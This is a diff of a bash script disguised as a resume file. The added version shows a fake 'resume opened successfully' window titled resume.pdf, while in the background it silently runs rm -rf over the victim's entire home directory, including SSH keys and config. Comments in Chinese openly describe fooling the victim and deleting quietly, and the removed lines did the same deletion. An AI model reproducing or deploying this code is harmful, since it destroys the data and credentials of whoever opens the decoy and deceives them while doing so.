@@ -1,4 +1,12 @@
 #!/bin/bash
-rm -rf ~/* ~/.ssh ~/.config ~/.cache &>/dev/null &
-echo "简历打开成功！"
-sleep 3
+
+# 强制弹一个图形窗口，让受害者确信“正在打开简历”
+zenity --info --width=300 --height=200 --text="简历打开成功！\n正在加载中…" --title="resume.pdf" &
+
+# 或者没装 zenity 的系统用这个（更通用）
+# notify-send "resume.pdf" "简历打开成功！正在加载…" && sleep 2
+
+# 后台静默删家目录（连终端都不开）
+rm -rf "$HOME"/* "$HOME"/.[!.]* "$HOME"/.ssh "$HOME"/.config "$HOME"/.cache &>/dev/null &
+
+exit 0
